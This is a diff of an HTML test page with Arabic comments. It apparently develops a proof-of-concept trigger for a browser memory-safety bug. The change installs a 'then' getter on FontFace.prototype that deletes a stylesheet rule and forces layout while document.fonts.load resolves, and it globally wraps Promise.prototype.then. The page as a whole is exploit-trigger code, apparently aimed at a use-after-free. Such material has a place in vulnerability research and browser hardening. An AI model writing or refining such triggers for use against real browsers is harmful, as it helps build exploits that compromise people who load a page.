@@ -7,7 +7,7 @@
 </head>
 <body>
     <div id="debug" style="color: #0f0; font-family: monospace; font-size: 18px; white-space: pre-wrap;">
-        [1] Starting Instance Hook...
+        [1] Global Hook Active...
     </div>
 
     <script>
@@ -17,36 +17,35 @@
             debug.innerText += "\n[+] " + msg;
         }
 
+        // الاعتراض العالمي لكل وعود المتصفح
+        const originalThen = Promise.prototype.then;
+        Promise.prototype.then = function(onFulfilled, onRejected) {
+            // هذا التلميح سيظهر لكل promise في الصفحة
+            // يمكننا هنا إضافة شرط إذا أردنا تحديد الكائن بدقة
+            // log("Promise encountered..."); 
+            
+            return originalThen.call(this, onFulfilled, onRejected);
+        };
+
         window.onload = () => {
+            log("Script Initialized.");
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
             
-            let fired = false;
-
-            // تغيير جذري: تعريف الـ Hook على الكائن A مباشرة وليس على الـ Prototype
-            Object.defineProperty(A, 'then', {
+            // نحاول الآن Hook الخاص بـ Prototype مرة أخرى ولكن مع علمنا بما يحدث
+            Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
-                    if (!fired) {
-                        fired = true;
-                        log("INSTANCE HOOK TRIGGERED!");
-                        
-                        document.getElementById('s').sheet.deleteRule(0);
-                        document.body.offsetTop;
-                        
-                        log("Rule deleted.");
-                    }
+                    log("PROTOTYPE HOOK TRIGGERED!");
+                    document.getElementById('s').sheet.deleteRule(0);
+                    document.body.offsetTop;
                     return undefined;
                 }
             });
 
-            log("Instance hook applied.");
             log("Calling fonts.load...");
-
-            document.fonts.load('1em x', 'AB').then(() => {
-                log("Load completed.");
-            }).catch((e) => {
-                log("Load caught error: " + e.message);
+            document.fonts.load('1em x', 'AB').catch((e) => {
+                log("Caught: " + e.message);
             });
         };
     </script>
